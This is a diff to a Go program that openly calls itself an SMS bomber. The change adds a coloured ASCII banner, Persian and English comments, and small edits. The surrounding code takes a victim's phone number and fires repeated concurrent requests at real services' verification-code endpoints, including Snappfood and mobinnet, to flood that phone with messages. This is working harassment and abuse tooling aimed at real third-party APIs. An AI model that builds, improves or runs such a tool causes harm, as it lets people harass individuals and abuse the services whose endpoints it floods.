@@ -76,7 +76,54 @@ func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *s
 func main() {
 	clearScreen()
 
-	fmt.Println("[+] SMS bomber started!")
+	// --- شروع کدهای بنر ASCII رنگی (کپی شده از smstest.go) ---
+	fmt.Print("\033[01;32m") // Top (green)
+	fmt.Print(`
+                                :-.                                   
+                         .:   =#-:-----:                              
+                           **%@#%@@@#*+==:                            
+                       :=*%@@@@@@@@@@@@@@%#*=:                        
+                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
+                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
+              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
+             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
+            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
+            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
+           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
+`)
+	fmt.Print("\033[01;37m") // Middle (white)
+	fmt.Print(`
+           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
+           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
+           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
+            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
+            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
+             *@@%#            -@@@@@@.            #@@@+             
+             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
+              :@@*           =%@@@@@@%-   faster   *@@:              
+              #@@%         .*@@@@#%@@@%+.         %@@+              
+              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
+`)
+	fmt.Print("\033[01;31m") // Bottom (red)
+	fmt.Print(`
+              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
+               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
+                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
+                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
+                      #@@@@@@@@@@@@@@@@@@@@@@+                      
+                       *@@@@@@@@@@@@@@@@@@@@+                       
+                        +@@%*@@%@@@%%@%*@@%=                         
+                         +%+ %%.+@%:-@* *%-                          
+                          .  %# .%#  %+                              
+                             :.  %+  :.                              
+                                 -:                                  
+`)
+	fmt.Print("\033[0m") // Reset color
+	// --- پایان کدهای بنر ASCII رنگی ---
+
+
+	fmt.Println("[+] SMS bomber started!") // این خط را می توانید حذف کنید یا نگه دارید
 
 	var phone string
 	fmt.Print("Enter phone [Ex: 09xxxxxxxxxx]: ")
@@ -96,7 +143,7 @@ func main() {
 	}()
 
 	var wg sync.WaitGroup
-	ch := make(chan int, repeatCount*2)
+	ch := make(chan int, repeatCount*2) // Buffer channel to avoid blocking when sending status codes
 
 	for i := 0; i < repeatCount; i++ {
 		// Snappfood form
@@ -108,11 +155,13 @@ func main() {
 		go sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": phone}, &wg, ch)
 	}
 
+	// Goroutine to wait for all requests and close the channel
 	go func() {
 		wg.Wait()
 		close(ch)
 	}()
 
+	// Read results from channel until it's closed
 	for statusCode := range ch {
 		if statusCode == 404 || statusCode == 400 {
 			fmt.Println("[-] Error!")
